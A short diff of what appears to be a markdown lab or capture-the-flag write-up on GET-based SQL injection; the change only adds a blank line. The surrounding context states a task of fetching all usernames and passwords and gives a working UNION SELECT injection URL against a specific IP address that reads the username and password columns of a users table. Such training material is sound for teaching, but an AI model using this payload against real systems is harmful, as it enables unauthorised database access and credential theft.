@@ -53,6 +53,7 @@ Your task is to fetch all the usernames and passwords from the database of the w
 
 ### payload:
 *direct method by guessing*
+
 http://13.233.141.160/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-2/?category=1 UNION SELECT username,NULL,NULL,password FROM users --+
 
 
